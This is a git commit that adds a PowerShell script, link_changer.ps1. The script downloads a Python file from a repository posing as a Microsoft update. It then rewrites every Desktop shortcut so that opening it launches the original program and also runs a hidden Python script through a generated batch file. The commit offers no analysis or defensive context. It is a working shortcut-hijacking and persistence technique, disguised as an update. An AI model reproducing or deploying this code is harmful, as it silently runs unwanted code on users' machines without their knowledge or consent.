1453b680ec99dea8ebc927da52e2dfda66d80c2d
Jenzmann <jonijanzen@t-online.de>
2022-03-16 21:56:50 +0100

    commit

---
+++ link_changer.ps1
@@ -0,0 +1,39 @@
+﻿Import-Module BitsTransfer
+$url = "https://raw.githubusercontent.com/Jenzmann/microsoftupdate/main/update.py"
+$dirs = @(
+    [Environment]::GetFolderPath("Desktop")
+)
+
+#$scriptPath = 'test'
+
+Clear-Host
+
+
+if(!(Test-Path "&($PSScriptRoot)\update.py")){
+
+    Start-BitsTransfer -Source $url -Destination $PSScriptRoot
+
+    $shell = new-object -com wscript.shell
+    
+    $fileCounter = 0;
+
+    foreach ($dir in $dirs) {
+        if($dir) {
+        
+
+            Get-ChildItem $dir -Filter *.lnk -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                $lnk = $shell.createShortcut($_.FullName)
+            
+                #Creating alternative fil
+                New-Item -Path . -Name "$($fileCounter).bat" -ItemType "file" -Value "Start """" ""$($lnk.TargetPath)""`npython3 test.py"
+                
+                # Manipulate Link
+
+                $lnk.TargetPath = "$($PSScriptRoot)\$($fileCounter).bat"
+                $lnk.Save()
+
+                $fileCounter ++
+            }
+        }
+    }
+}
